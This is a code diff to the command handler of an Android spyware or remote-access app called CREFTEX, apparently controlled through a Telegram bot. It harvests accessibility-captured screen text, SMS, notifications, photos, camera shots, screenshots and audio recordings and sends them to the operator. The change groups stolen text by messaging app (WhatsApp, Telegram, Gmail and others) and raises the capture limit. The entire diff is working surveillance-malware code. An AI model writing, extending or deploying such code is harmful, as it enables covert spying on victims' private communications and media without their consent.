@@ -69,6 +69,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  MENUS
+    // ═══════════════════════════════════════════
     private fun showMainMenu(ctx: Context) {
         val text = """
             🎛 *لوحة التحكم — CREFTEX*
@@ -104,7 +107,7 @@ object CommandExecutor {
     }
 
     // ═══════════════════════════════════════════
-    //  ACCESSIBILITY — قراءة نصوص الشاشة
+    //  ACCESSIBILITY — نصوص الشاشة مجمّعة
     // ═══════════════════════════════════════════
     private fun fetchAccessibility(ctx: Context) {
         runJob(ctx, "accessibility") {
@@ -121,55 +124,83 @@ object CommandExecutor {
                 return@runJob
             }
 
-            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 500)
+            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 800)
             if (lines.isEmpty()) {
                 TelegramApi.sendMessage(
                     "📝 *لا توجد نصوص محفوظة بعد*\n\n" +
-                    "الخدمة مفعّلة، لكن لم تُقرأ أي نصوص.\n" +
-                    "جرّب:\n" +
-                    "• فتح أي تطبيق واكتب شي\n" +
-                    "• فتح واتساب/رسائل\n" +
-                    "• تصفح الإنترنت\n\n" +
-                    "ثم اطلب الأمر مرة ثانية.",
+                    "جرّب فتح تطبيق واكتب فيه، ثم أعد الأمر.",
                     KeyboardBuilder.backToMenu()
                 )
                 return@runJob
             }
 
-            val sb = StringBuilder()
-            sb.append("📝 *نصوص الشاشة* — ${lines.size} حدث\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+            // تجميع حسب الحزمة
+            val grouped = HashMap<String, MutableList<Pair<String, String>>>()
 
-            var count = 0
             for (line in lines) {
                 try {
                     val obj = JSONObject(line)
-                    val type = obj.optString("type")
-                    if (type != "accessibility") continue
-
+                    if (obj.optString("type") != "accessibility") continue
+                    val pkg = obj.optString("package", "unknown")
                     val time = obj.optString("time", "")
-                    val pkg = obj.optString("package", "")
                     val texts = obj.optString("texts", "")
+                    if (texts.isBlank()) continue
+                    grouped.getOrPut(pkg) { mutableListOf() }.add(time to texts)
+                } catch (_: Exception) {}
+            }
 
-                    sb.append("📱 *$pkg*\n")
-                    sb.append("🕐 $time\n")
-                    sb.append("$texts\n\n")
+            if (grouped.isEmpty()) {
+                TelegramApi.sendMessage("📝 لا يوجد محتوى صالح.", KeyboardBuilder.backToMenu())
+                return@runJob
+            }
 
-                    count++
+            // أسماء التطبيقات
+            val appNames = mapOf(
+                "org.telegram.messenger" to "Telegram",
+                "org.telegram.plus" to "Telegram Plus",
+                "com.whatsapp" to "WhatsApp",
+                "com.whatsapp.w4b" to "WhatsApp Business",
+                "com.instagram.android" to "Instagram",
+                "com.facebook.katana" to "Facebook",
+                "com.facebook.orca" to "Messenger",
+                "com.google.android.apps.messaging" to "Messages",
+                "com.android.chrome" to "Chrome",
+                "com.twitter.android" to "Twitter",
+                "com.snapchat.android" to "Snapchat",
+                "com.google.android.gm" to "Gmail",
+                "com.android.vending" to "Play Store",
+                "com.google.android.apps.maps" to "Maps",
+                "com.google.android.youtube" to "YouTube"
+            )
+
+            // إرسال كل تطبيق كرسالة منفصلة
+            for ((pkg, items) in grouped) {
+                val appName = appNames[pkg] ?: pkg
+
+                val sb = StringBuilder()
+                sb.append("📱 *$appName*\n")
+                sb.append("━━━━━━━━━━━━━━━━━━━━\n")
+
+                // آخر 20 حدث فقط
+                val recent = items.takeLast(20)
+                for (item in recent) {
+                    sb.append("🕐 `${item.first}`\n")
+                    sb.append("💬 ${item.second}\n\n")
 
                     if (sb.length > 3500) {
                         TelegramApi.sendMessage(sb.toString())
                         sb.clear()
+                        sb.append("📱 *$appName* (تكملة)\n\n")
                     }
+                }
 
-                    if (count >= 50) {
-                        sb.append("… +${lines.size - count} آخرين\n")
-                        break
-                    }
-                } catch (_: Exception) {}
+                if (sb.isNotEmpty()) {
+                    TelegramApi.sendMessage(sb.toString())
+                    Thread.sleep(300)
+                }
             }
 
-            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
+            TelegramApi.sendMessage("✅ تم عرض النصوص المجمّعة.", KeyboardBuilder.backToMenu())
         }
     }
 
@@ -178,6 +209,9 @@ object CommandExecutor {
         TelegramApi.sendMessage("🗑 تم حذف النصوص المخزنة", KeyboardBuilder.backToMenu())
     }
 
+    // ═══════════════════════════════════════════
+    //  CAMERA
+    // ═══════════════════════════════════════════
     private fun captureCamera(ctx: Context, front: Boolean) {
         runJob(ctx, "cam") {
             val label = if (front) "أمامية 🤳" else "خلفية 📸"
@@ -192,6 +226,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  SCREEN CAPTURE
+    // ═══════════════════════════════════════════
     private fun captureOnce(ctx: Context) {
         if (!ScreenCapture.isReady) {
             TelegramApi.sendMessage(
@@ -241,6 +278,9 @@ object CommandExecutor {
         TelegramApi.sendMessage("📷 ⏹ تم إيقاف اللقطات المتكررة", KeyboardBuilder.mainMenu())
     }
 
+    // ═══════════════════════════════════════════
+    //  PHOTOS
+    // ═══════════════════════════════════════════
     private fun fetchAllPhotos(ctx: Context) {
         runJob(ctx, "photos_all") {
             val all = MediaScanner.scanImages(ctx)
@@ -301,6 +341,9 @@ object CommandExecutor {
         )
     }
 
+    // ═══════════════════════════════════════════
+    //  SMS
+    // ═══════════════════════════════════════════
     private fun fetchAllSms(ctx: Context) {
         runJob(ctx, "sms_all") {
             val inbox = SmsReader.scanAll(ctx)
@@ -337,6 +380,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  NOTIFICATIONS
+    // ═══════════════════════════════════════════
     private fun fetchAllNotifs(ctx: Context) {
         runJob(ctx, "notifs_all") {
             val lines = DataStore.readNotifications(ctx, limit = 5000)
@@ -378,6 +424,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  AUDIO
+    // ═══════════════════════════════════════════
     private fun startAudio(ctx: Context) {
         if (AudioRecorder.isRunning()) {
             TelegramApi.sendMessage("🎤 التسجيل شغّال بالفعل")
@@ -393,6 +442,9 @@ object CommandExecutor {
         TelegramApi.sendMessage("🎤 ⏹ تم إيقاف التسجيل", KeyboardBuilder.mainMenu())
     }
 
+    // ═══════════════════════════════════════════
+    //  FETCH ALL
+    // ═══════════════════════════════════════════
     private fun fetchEverything(ctx: Context) {
         runJob(ctx, "all") {
             TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*\n\n0️⃣ معلومات الجهاز...")
@@ -427,6 +479,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  JOB MANAGEMENT
+    // ═══════════════════════════════════════════
     private fun stopJob(ctx: Context, jobId: String) {
         runningJobs[jobId] = false
         runningJobs.remove(jobId)
